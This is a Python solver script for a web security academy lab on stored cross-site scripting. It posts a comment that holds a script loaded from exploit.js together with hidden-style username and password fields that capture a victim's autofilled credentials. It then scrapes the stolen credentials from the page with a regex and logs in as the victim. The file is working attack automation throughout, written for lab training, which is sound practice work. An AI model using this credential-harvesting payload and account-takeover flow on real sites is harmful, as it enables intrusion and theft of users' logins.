from web_security_academy.core.logger import logger
from web_security_academy.core.utils import read_file

import re


def solve_lab(session):
    xss = read_file("exploit.js").decode()
    xss = f'<script type="module">{xss}</script>\n'
    xss += '<input required type=username name="username" autofocus>\n'
    xss += '<input required type="password" name="password">'

    csrf = session.get_csrf_token("/post?postId=1")
    data = {
        "csrf": csrf,
        "postId": 1,
        "comment": xss,
        "name": "user",
        "email": "user@example.com",
        "website": "",
    }
    session.post_path("/post/comment", data=data)
    logger.info("Commented the following payload:\n")
    print(xss, end="\n\n")

    resp = session.get_path("/post?postId=1")
    regex = r"username=([A-Za-z0-9\+\/]+) password=([A-Za-z0-9\+\/]+)"
    match = re.search(regex, resp.text)
    username, password = match.group(1), match.group(2)
    logger.info(f'Extracted credentials: "{username}:{password}"')
    session.login(username, password)
